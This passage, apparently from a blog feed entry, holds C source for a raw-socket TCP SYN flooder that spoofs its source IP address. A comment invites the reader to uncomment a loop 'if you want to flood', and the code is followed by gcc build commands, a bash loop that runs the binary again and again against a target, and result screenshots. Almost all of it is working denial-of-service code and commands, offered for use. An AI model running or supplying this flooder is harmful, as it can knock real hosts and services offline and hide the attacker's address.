</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c1">//Create a raw socket</span>
</span><span class='line'><span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
</span><span class='line'><span class="c1">//Datagram to represent the packet</span>
</span><span class='line'><span class="kt">char</span> <span class="n">datagram</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="p">,</span> <span class="n">source_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'><span class="c1">//IP header</span>
</span><span class='line'><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">;</span>
</span><span class='line'><span class="c1">//TCP header</span>
</span><span class='line'><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="n">tcph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">datagram</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">));</span>
</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'><span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">source_ip</span> <span class="p">,</span> <span class="s">&quot;192.168.10.78&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'><span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.78&quot;);</span>
</span><span class='line'><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span><span class="s">&quot;10.10.24.79&quot;</span><span class="p">);</span>
</span><span class='line'><span class="c1">//sin.sin_addr.s_addr = inet_addr (&quot;192.168.10.111&quot;);</span>
</span><span class='line'>
</span><span class='line'><span class="n">memset</span> <span class="p">(</span><span class="n">datagram</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> <span class="cm">/* zero out the buffer */</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//Fill in the IP Header</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">);</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">54321</span><span class="p">);</span>  <span class="c1">//Id of this packet</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">//Set to 0 before calculating checksum</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>    <span class="c1">//Spoof the source ip address</span>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tot_len</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//TCP Header</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ack_seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">doff</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>      <span class="cm">/* first and only tcp segment */</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">fin</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">syn</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">rst</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">psh</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">ack</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">urg</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">window</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">5840</span><span class="p">);</span> <span class="cm">/* maximum allowed window size */</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="cm">/* if you set a checksum to zero, your kernel&#39;s IP stack</span>
</span><span class='line'><span class="cm">            should fill in the correct checksum during transmission */</span>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">urg_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="c1">//Now the IP checksum</span>
</span><span class='line'>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">source_address</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">dest_address</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">placeholder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'><span class="n">psh</span><span class="p">.</span><span class="n">tcp_length</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">psh</span><span class="p">.</span><span class="n">tcp</span> <span class="p">,</span> <span class="n">tcph</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="n">tcph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">psh</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">pseudo_header</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//IP_HDRINCL to tell the kernel that headers are included in the packet</span>
</span><span class='line'><span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">one</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Error setting IP_HDRINCL. Error number : %d . Error message : %s </span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">,</span> <span class="n">errno</span> <span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//Uncommend the loop if you want to flood :)</span>
</span><span class='line'><span class="c1">//while (1)</span>
</span><span class='line'><span class="c1">//{</span>
</span><span class='line'>    <span class="c1">//Send the packet</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span>      <span class="cm">/* our socket */</span>
</span><span class='line'>                <span class="n">datagram</span><span class="p">,</span>   <span class="cm">/* the buffer containing headers and data */</span>
</span><span class='line'>                <span class="n">iph</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">tot_len</span><span class="p">,</span>    <span class="cm">/* total length of our datagram */</span>
</span><span class='line'>                <span class="mi">0</span><span class="p">,</span>      <span class="cm">/* routing flags, normally always 0 */</span>
</span><span class='line'>                <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sin</span><span class="p">,</span>   <span class="cm">/* socket addr, just like in */</span>
</span><span class='line'>                <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span>       <span class="cm">/* a normal send() */</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">//Data send successfully</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Packet Send </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="c1">//}</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3>test start</h3>

<h4>compile with gcc</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>indent -kr -i8 sysflood.c
</span><span class='line'>gcc synflood.c -o synflood
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>test bash (Only running three seconds)</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;while :
</span><span class='line'><span class="k">do</span>
</span><span class='line'>/path/to/synflood
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>results</h4>

<p><img src="/images/result_syn.jpg" alt="alt text" /><br />
<img src="/images/flood_test.jpg" alt="alt text" /><br /></p>

<h4>more......</h4>
]]></content>
  </entry>
  
</feed>
